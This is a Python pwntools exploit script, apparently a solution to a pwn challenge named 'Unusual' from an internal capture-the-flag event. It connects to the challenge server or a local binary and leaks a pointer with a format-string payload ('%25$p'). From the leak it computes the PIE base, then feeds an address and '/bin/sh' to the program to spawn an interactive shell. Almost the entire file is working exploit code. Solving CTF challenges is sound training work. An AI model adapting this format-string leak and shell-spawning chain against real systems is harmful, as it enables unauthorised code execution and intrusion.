#!/usr/bin/env python3

from pwn import *

PATH = "/home/kali/CTFs/MC/internal-ctf-2.0/challenges/pwn/Unusual/solution/unusual" 

exe = ELF(PATH, checksec=False)

if args.REMOTE:
    HOST = "ghctf.microclub.info"
    PORT = 12607
    p = remote(HOST, PORT, ssl=True)
    # HOST = "localhost"
    # PORT = 12607
    # p = remote(HOST, PORT)

else:
    p = process(PATH)
    if args.GDB:
        GDB_SCRIPT = \
"""
b *SetName
b *SetAddr
b *ListCurrentDir
c
"""
        gdb.attach(p, gdbscript=GDB_SCRIPT)

p.sendline(b'1')        # SetName
p.sendline(b'%25$p')
p.recvuntil(b'Welcome, ')

leak = int(p.recvline().decode(), 16)
pie_base = leak - 0x3d78  # Got it from GDB

print(f"leak: {hex(leak)}")
print(f"pie_base: {hex(pie_base)}")

p.sendline(b'2')
p.sendline(hex(pie_base + 0x20cd).encode())
p.sendline(b'/bin/sh\x00')

p.sendline(b'3')

p.interactive()